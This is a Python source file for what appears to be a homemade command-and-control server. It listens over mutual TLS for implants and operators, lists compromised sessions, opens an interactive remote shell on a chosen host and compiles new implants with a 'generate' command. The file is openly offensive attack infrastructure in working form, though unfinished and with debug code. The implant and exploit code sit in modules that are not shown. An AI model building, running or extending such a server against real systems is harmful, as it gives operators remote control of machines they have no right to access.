#!/usr/bin/env python3
# TODO: Convert CLI to CMD2
import logging
import sys


from mtls import mtls, clienthandler
from generate.generate import generate
from queue import Queue
from handler.handler import Handler


class C2Server(object):

    def __init__(self):
        ## Generating stuff for implant comms ##

        self.requestq = Queue() #this is a shared que between the handler and the listner, which fills with implant registration
        self.implantlistener = mtls.Listener(self.requestq) #begins implant listener w/ mtls encryption

        self.handler = Handler(self.requestq)
        self.handler.start()
        print("Listening for implants...")
        self.operatorlistener = clienthandler.Listener()
        print("Listening for operators...")

        self.shutdown = 0

    def serverMain(self):
        while self.shutdown == 0:
            userin = input("$ ")
            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
            commandStr = ' '.join(userin)
            logging.info("Command: " + commandStr)
            self.executecommand(userin.split())

    def executecommand_session(self, session_id, command):
            conn, addr = self.implantlistener.sessions.get(session_id) 
            print(f"Using session with {addr}")

            ###sys.stdout.buffer.write(mtls.session(conn, command)) # uncomment once operator works 

            ###temporary shell -- to be removed once operator works
            while True:
                userin = input("[session] > ") 

                if userin == "exit":
                   break 

                output = mtls.session(conn, userin)

                if not output:
                    break

                sys.stdout.buffer.write(output) 

    def executecommand(self, command):
        print("DEBUG: IN_EXECUTECOMMAND with command:", command)

        #command is an array of strings
        if len(command) < 1:
            print("Invalid Command")
            return("Invalid Command")

        elif command[0] == "sessions":
            for id in self.implantlistener.sessions.list():
                print(id)

        # Interact with a session
        elif command[0] == "use":
            if len(command) == 2:
                self.executecommand_session(command[1], 'whoami') # TODO change whoami to operator command once it works
            else:
                print("Usage: use <session>")

        # Compile an implant
        elif command[0] == "generate":
            print("Generating the implant...")
            generate(self.implantlistener.client_certs)

        else:
            print("Unknown Command")
            return("Unknown Command")


def main():
    C2Server().serverMain()


if __name__ == "__main__":
    main()
